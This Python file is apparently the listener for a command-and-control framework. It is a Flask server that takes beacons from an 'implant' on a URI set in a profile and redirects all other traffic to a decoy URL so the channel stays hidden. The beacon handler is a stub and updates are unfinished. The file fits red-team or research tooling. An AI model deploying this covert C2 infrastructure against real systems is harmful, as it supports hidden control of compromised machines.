import base64
import datetime
import logging
import json
import pymysql
import random
import string
from core.config import *
from core.message import *
from gevent.wsgi import WSGIServer
from flask import Flask, request, redirect
from logging.handlers import RotatingFileHandler

# creates Flask app
app = Flask(__name__)
app.debug = True


@app.errorhandler(404)
def page_not_found_redirect(error):
    """
    DESCRIPTION:
        This function redirects all HTTP 404 requests to "redirect_url" (defined in profile)
    """
    return redirect(app.config["redirect_url"])


@app.route("/<path:path>")
def catch_all_redirect(path):
    """
    DESCRIPTION:
        This function redirects all other HTTP requests to "redirect_url" (defined in profile)
    """
    return redirect(app.config["redirect_url"])


def beacon_response():
    """
        This function is called when an implant beacons
    """
    # if request method is "GET"
    # the implant will never use this method
    # redirects client to the "redirect_url" specified in the profile
    if request.method == "GET":
        return redirect(app.config["redirect_url"])

    # else valid method
    else:
        return "beacon response"


def start_flask_server(protocol, port, profile):
    """
    DESCRIPTION:
        This function starts the Flask server
    """
    # tries to start the Flask server
    try:
        # reads profile as a file
        with open(profile) as file:
            j = json.load(file)

        # creates Flask global variable for "redirect_url"
        app.config["redirect_url"] = j["implant"]["redirect_url"]

        # adds beacon route
        app.add_url_rule(j["implant"]["beacon_uri"], None, beacon_response, methods=["GET", "POST"])

        # TO DO: add update route here

        # configures Flask logging with 100 meg max file size
        # all requests are logged to "listener/logs/access.log"
        log_handler = RotatingFileHandler("logs/access.log", maxBytes=100000000, backupCount=3)
        app.logger.addHandler(log_handler)
        app.logger.setLevel(logging.INFO)

        # starts Flask server
        server = WSGIServer(("0.0.0.0", port), app, log=app.logger)
        print_status("[+] Started listener on tcp/" + str(port))
        server.serve_forever()

    # ignores KeyboardInterrupt exception
    except KeyboardInterrupt:
        pass

    # exception raised starting Flask server
    except Exception:
        raise
